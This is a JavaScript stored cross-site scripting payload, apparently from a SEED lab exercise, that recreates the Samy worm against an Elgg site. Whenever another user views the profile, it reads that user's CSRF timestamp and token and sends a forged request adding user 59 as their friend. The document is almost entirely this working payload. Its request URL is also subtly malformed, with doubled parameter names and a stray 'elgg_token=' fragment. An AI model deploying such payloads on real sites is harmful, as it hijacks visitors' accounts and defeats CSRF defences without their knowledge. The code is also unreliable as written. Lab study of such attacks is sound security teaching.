<script type="text/javascript">
    window.onload = function () {   
        var Ajax=null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts; // Time Stamp
        var token= "&__elgg_token=" + elgg.security.token.__elgg_token; // Security Token
        var addWhomID = 59; // ID of Samy, the user to be added as friend
        var whoIsViewingID = elgg.session.user.guid; // ID of the user who is viewing the profile with ID 'addWhomID'

        // If the user is viewing his own profile, then the attack is not performed
        if (whoIsViewingID == addWhomID) return;

        var sendurl = `/action/friends/add?friend=${addWhomID}&__elgg_ts=${ts}elgg_token=${token}&__elgg_ts=${ts}&__elgg_token=${token}`;

        //Create and send Ajax request to add friend
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true); // last boolean value is for asynchronous request making
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send();
	}
</script>